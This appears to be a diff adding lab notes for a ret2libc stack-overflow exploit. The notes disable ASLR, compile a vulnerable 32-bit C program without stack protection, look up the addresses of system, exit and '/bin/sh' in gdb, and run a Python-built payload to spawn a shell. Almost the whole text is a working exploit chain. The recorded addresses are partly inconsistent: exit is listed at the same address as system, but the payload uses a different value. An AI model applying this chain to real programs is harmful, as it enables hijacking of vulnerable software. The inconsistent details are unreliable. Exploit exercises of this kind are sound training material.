@@ -1,0 +1,13 @@
+sudo sysctl -w kernel.randomize_va_space=0
+gcc -m32 -g vulnerable.c -o vulnerable -fno-stack-protector -mpreferred-stack-boundary=2
+
+gdb vulnerable -q
+
+system 0xf7e50db0
+exit 0xf7e50db0
+("bin/sh") 0xf7f71b2b
+
+payload = 12*A + system + exit + ("bin/sh")
+
+r `python -c 'print("A"*12+"\xb0\x0d\xe5\xf7"+"\xe0\x49\xe4\xf7"+"\x2b\x1b\xf7\xf7")'`
+./vulnerable `python -c 'print("A"*12+"\xb0\x0d\xe5\xf7"+"\xe0\x49\xe4\xf7"+"\x2b\x1b\xf7\xf7")'`
